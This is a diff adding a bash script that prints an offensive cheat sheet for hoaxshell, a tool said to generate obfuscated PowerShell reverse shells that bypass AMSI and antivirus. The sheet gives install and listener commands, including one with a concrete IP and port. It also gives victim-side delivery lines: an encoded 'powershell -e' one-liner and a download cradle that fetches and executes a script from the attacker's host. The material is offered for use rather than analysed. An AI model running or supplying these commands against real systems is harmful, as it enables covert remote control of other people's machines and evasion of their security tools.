@@ -1,0 +1,54 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── HOAXSHELL — OBFUSCATED PS REVERSE SHELL ──────────${NC}"
+printf "\n"
+echo -e "  Note: Generates highly obfuscated PowerShell reverse shells."
+echo -e "  Note: Bypasses AMSI + AV via custom obfuscation. HTTP/HTTPS."
+echo -e "  ${BLUE}github.com/t3l3machus/hoaxshell${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Install ──────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}git clone https://github.com/t3l3machus/hoaxshell${NC}"
+echo -e "  ${GREEN}pip3 install -r requirements.txt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Usage ────────────────────────────────────────────${NC}"
+echo -e "  Note: HTTP (default port 8080):"
+echo -e "  ${GREEN}python3 hoaxshell.py -s <KALI_IP>${NC}             # http default"
+printf "\n"
+echo -e "  Note: HTTPS self-signed:"
+echo -e "  ${GREEN}python3 hoaxshell.py -s <KALI_IP> -c${NC}          # https self-signed"
+printf "\n"
+echo -e "  Note: Custom port:"
+echo -e "  ${GREEN}python3 hoaxshell.py -s <KALI_IP> -p 443${NC}      # custom port"
+printf "\n"
+echo -e "  Note: Grab mode - victim initiates, output grabbed:"
+echo -e "  ${GREEN}python3 hoaxshell.py -s <KALI_IP> -g${NC}          # grab mode"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Output ───────────────────────────────────────────${NC}"
+echo -e "  Note: Hoaxshell generates a PS one-liner to run on victim."
+echo -e "  Note: Copy the output one-liner -> paste it on the target machine."
+echo -e "  Note: Shell arrives at your hoaxshell listener."
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Delivery Example ─────────────────────────────────${NC}"
+echo -e "  Note: Start hoaxshell on Kali:"
+echo -e "  ${GREEN}python3 hoaxshell.py -s 192.168.45.229 -p 443 -c${NC}"
+printf "\n"
+echo -e "  Note: Run generated PS command on victim:"
+echo -e "  ${GREEN}powershell -e <GENERATED_BASE64_ONELINER>${NC}"
+printf "\n"
+echo -e "  Note: Alternative delivery via download cradle:"
+echo -e "  ${GREEN}powershell iex (iwr http://<KALI_IP>/hoax.ps1 -UseBasicParsing)${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
